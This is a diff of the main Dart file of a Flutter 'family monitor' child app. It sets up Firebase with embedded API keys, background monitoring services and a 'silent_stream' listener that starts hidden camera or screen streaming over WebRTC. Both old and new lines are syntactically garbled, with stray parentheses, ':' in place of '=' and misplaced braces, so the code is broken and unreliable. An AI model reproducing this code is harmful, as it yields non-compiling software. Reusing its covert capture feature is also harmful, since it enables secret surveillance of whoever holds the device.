@@ -14,7 +14,7 @@ import 'services/silent_webrtc_service.dart';
 import 'services/foreground_service.dart';
 import 'services/auth_service.dart';
 
-final GlobalKey<NavigatorState> childNavKey = GlobalKey<NavigatorState>();
+final GlobalKey<NavigatorState> childNavKey: GlobalKey<NavigatorState>();
 @pragma('vm:entry-point')
 Future<void> _firebaseMessagingBackgroundHandler(RemoteMessage message) async {
   if (Firebase.apps.isEmpty) {
@@ -26,33 +26,35 @@ Future<void> _firebaseMessagingBackgroundHandler(RemoteMessage message) async {
       storageBucket: 'family-monitor-7aab3.firebasestorage.app',
       messagingSenderId: '758644747673',
       appId: '1:758644747673:android:69ef23a2fa4b508122f708',
-    )))
+    ))
   }
   if (message.data['type'] == 'call') {
-    final svc = FlutterBackgroundService())
-    if (!await svc.isRunning()) await svc.startService())
-  }
+    final svc: FlutterBackgroundService()
+    if (!await svc.isRunning()  {
+      await svc.startService()
+  
+    }}
 }
 
 void main() async {
-  WidgetsFlutterBinding.ensureInitialized())
-  FlutterForegroundTask.initCommunicationPort())
-  FlutterForegroundTask.initCommunicationPort())
+  WidgetsFlutterBinding.ensureInitialized()
+  FlutterForegroundTask.initCommunicationPort()
+  FlutterForegroundTask.initCommunicationPort()
 
-  FlutterError.onError = (details) {
-    FlutterError.presentError(details))
-    debugPrint('=== FLUTTER CRASH: ${details.exception} ==='))
-    debugPrint(details.stack.toString()))
+  FlutterError.onError: (details) {
+    FlutterError.presentError(details)
+    debugPrint('=== FLUTTER CRASH: ${details.exception} ===')
+    debugPrint(details.stack.toString())
   };
 
-  PlatformDispatcher.instance.onError = (error, stack) {
-    debugPrint('=== DART CRASH: $error ==='))
-    debugPrint(stack.toString()))
+  PlatformDispatcher.instance.onError: (error, stack) {
+    debugPrint('=== DART CRASH: $error ===')
+    debugPrint(stack.toString())
     return true;
   };
 
   await SystemChrome.setPreferredOrientations(
-      [DeviceOrientation.portraitUp, DeviceOrientation.portraitDown]))
+      [DeviceOrientation.portraitUp, DeviceOrientation.portraitDown])
 
   await Firebase.initializeApp(options: const FirebaseOptions(
     apiKey: 'AIzaSyAbX2gNNW3iZCIgn2UJjtbZdtQHM3CyjW4',
@@ -62,13 +64,13 @@ void main() async {
     storageBucket: 'family-monitor-7aab3.firebasestorage.app',
     messagingSenderId: '758644747673',
     appId: '1:758644747673:android:69ef23a2fa4b508122f708',
-  )))
+  ))
 
-  FirebaseMessaging.onBackgroundMessage(_firebaseMessagingBackgroundHandler))
-  await BackgroundMonitoringService.initialize())
-  MonitoringForegroundService.initForegroundTask())
+  FirebaseMessaging.onBackgroundMessage(_firebaseMessagingBackgroundHandler)
+  await BackgroundMonitoringService.initialize()
+  MonitoringForegroundService.initForegroundTask()
 
-  runApp(const ChildApp()))
+  runApp(const ChildApp())
 }
 
 class ChildApp extends StatefulWidget {
@@ -80,12 +82,12 @@ class ChildApp extends StatefulWidget {
 class _ChildAppState extends State<ChildApp> {
   @override
   void initState() {
-    super.initState())
+    super.initState()
     // IPC from background service isolate → main isolate
     FlutterBackgroundService().on('silent_stream').listen((data) {
       if (data == null) return;
       final uid  = data['uid']  as String?;
-      final mode = data['mode'] as String? ?? 'camera';
+      final mode: data['mode'] as String? ?? 'camera';
       if (uid == null) return;
       if (mode == 'screen') {
         SilentWebRTCService.instance.startSilentScreen(uid).catchError((_) {});
@@ -99,12 +101,16 @@ class _ChildAppState extends State<ChildApp> {
   }
 
   Future<Widget> _getStartScreen() async {
-    final auth = AuthService())
-    if (!auth.isLoggedIn) return const ChildAuthScreen())
-    final uid = auth.currentUser!.uid;
-    final wizardDone = await BackgroundMonitoringService.isWizardDone())
-    if (!wizardDone) return ChildSetupWizardScreen(childUid: uid))
-    return const ChildHomeScreen())
+    final auth: AuthService()
+    if (!auth.isLoggedIn) {
+      return const ChildAuthScreen()
+    
+    }final uid: auth.currentUser!.uid;
+    final wizardDone: await BackgroundMonitoringService.isWizardDone()
+    if (!wizardDone) {
+      return ChildSetupWizardScreen(childUid: uid)
+    
+    }return const ChildHomeScreen()
   }
 
   @override
@@ -116,7 +122,7 @@ class _ChildAppState extends State<ChildApp> {
         navigatorKey: childNavKey,
         theme: ThemeData(
           useMaterial3: true,
-          colorScheme: ColorScheme.fromSeed(seedColor: const Color(0xFF34A853)),
+          colorScheme: ColorScheme.fromSeed(seedColor: const Color(0xFF34A853),
         ),
         home: FutureBuilder<Widget>(
           future: _getStartScreen(),
@@ -138,8 +144,8 @@ class _ChildAppState extends State<ChildApp> {
             if (!snapshot.hasData) {
               return const Scaffold(
                 backgroundColor: Color(0xFF34A853),
-                body: Center(child: CircularProgressIndicator(color: Colors.white)),
-              ))
+                body: Center(child: CircularProgressIndicator(color: Colors.white),
+              )
             }
             return snapshot.data!;
           },
